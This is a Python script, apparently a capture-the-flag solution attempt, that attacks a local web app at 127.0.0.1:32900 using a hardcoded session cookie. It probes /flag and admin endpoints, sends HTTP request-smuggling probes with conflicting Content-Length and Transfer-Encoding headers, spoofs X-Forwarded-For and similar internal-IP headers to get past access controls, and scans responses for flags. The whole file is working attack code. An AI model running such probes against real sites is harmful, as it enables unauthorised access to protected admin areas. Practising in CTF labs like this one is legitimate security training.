import requests
import re

TARGET = "http://127.0.0.1:32900"
SESSION_COOKIE = "58P3X-jvhvlu5K4TJVpzuTVwTbpzpmq1-GjZz0CtaeM"
COOKIES = {"session": SESSION_COOKIE}

def search_flag(response_text):
    """Search for FLAG{} pattern"""
    flags = re.findall(r'FLAG\{[^}]+\}', response_text)
    if flags:
        print(f"\n*** FLAG FOUND: {flags[0]} ***\n")
        return flags[0]
    return None

print("[*] Testing HTTP Request Smuggling")
print(f"[*] Target: {TARGET}\n")

# First, let's check what endpoints exist
print("[TEST 0] Baseline - Check accessible endpoints")

endpoints = ["/", "/flag", "/admin", "/admin_panel"]
for endpoint in endpoints:
    try:
        resp = requests.get(f"{TARGET}{endpoint}", cookies=COOKIES, timeout=3)
        print(f"{endpoint}: Status {resp.status_code}, Length {len(resp.text)} bytes")
        if resp.status_code == 200:
            print(f"  Content preview: {resp.text[:200]}")
            search_flag(resp.text)
    except Exception as e:
        print(f"{endpoint}: Error - {e}")

print("\n" + "="*60)

# Test 1: Try direct access with different methods
print("\n[TEST 1] Direct Access Attempts")

methods_to_test = [
    ("GET", "/flag"),
    ("POST", "/flag"),
    ("GET", "/admin"),
    ("POST", "/admin"),
    ("GET", "/admin_panel"),
    ("POST", "/admin_panel"),
]

for method, endpoint in methods_to_test:
    try:
        if method == "GET":
            resp = requests.get(f"{TARGET}{endpoint}", cookies=COOKIES, timeout=3)
        else:
            resp = requests.post(f"{TARGET}{endpoint}", cookies=COOKIES, timeout=3)
        
        print(f"\n{method} {endpoint}: Status {resp.status_code}")
        print(f"Response ({len(resp.text)} bytes):\n{resp.text}")
        search_flag(resp.text)
    except Exception as e:
        print(f"{method} {endpoint}: Error - {e}")

print("\n" + "="*60)

# Test 2: Try with custom headers that might trigger smuggling
print("\n[TEST 2] Custom Headers - Conflicting Content-Length/Transfer-Encoding")

headers_variations = [
    {"Content-Length": "0", "Transfer-Encoding": "chunked"},
    {"Transfer-Encoding": "chunked", "Content-Length": "0"},
    {"Content-Length": "5", "Transfer-Encoding": "chunked"},
    {"Transfer-Encoding": "identity", "Content-Length": "0"},
]

for i, headers in enumerate(headers_variations):
    try:
        print(f"\nVariation {i+1}: {headers}")
        resp = requests.post(f"{TARGET}/", headers=headers, cookies=COOKIES, data="", timeout=3)
        print(f"Status {resp.status_code}, Response ({len(resp.text)} bytes):\n{resp.text}")
        search_flag(resp.text)
    except Exception as e:
        print(f"Error: {e}")

print("\n" + "="*60)

# Test 3: Try with X-Forwarded-For and other proxy headers
print("\n[TEST 3] Proxy Headers - Simulate Internal Request")

internal_headers = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "localhost"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
]

for endpoint in ["/flag", "/admin", "/admin_panel"]:
    for headers in internal_headers:
        try:
            resp = requests.get(f"{TARGET}{endpoint}", headers=headers, cookies=COOKIES, timeout=3)
            if resp.status_code != 403 and resp.status_code != 404:
                print(f"\n{endpoint} with {headers}: Status {resp.status_code}")
                print(f"Response:\n{resp.text}")
                search_flag(resp.text)
        except Exception as e:
            pass

print("\n" + "="*60)

# Test 4: Check if there's any information in response headers
print("\n[TEST 4] Response Header Analysis")

try:
    resp = requests.get(f"{TARGET}/", cookies=COOKIES, timeout=3)
    print("\nResponse Headers:")
    for header, value in resp.headers.items():
        print(f"  {header}: {value}")
    
    # Check for server info
    if 'Server' in resp.headers:
        print(f"\n[+] Server: {resp.headers['Server']}")
    if 'X-Powered-By' in resp.headers:
        print(f"[+] X-Powered-By: {resp.headers['X-Powered-By']}")
except Exception as e:
    print(f"Error: {e}")

print("\n" + "="*60)

# Test 5: Try OPTIONS method to see allowed methods
print("\n[TEST 5] OPTIONS Method - Discover Allowed Methods")

for endpoint in ["/", "/flag", "/admin", "/admin_panel"]:
    try:
        resp = requests.options(f"{TARGET}{endpoint}", cookies=COOKIES, timeout=3)
        print(f"\nOPTIONS {endpoint}: Status {resp.status_code}")
        if 'Allow' in resp.headers:
            print(f"  Allowed methods: {resp.headers['Allow']}")
        print(f"  Response: {resp.text[:200]}")
        search_flag(resp.text)
    except Exception as e:
        print(f"OPTIONS {endpoint}: Error - {e}")

print("\n[*] Testing completed")

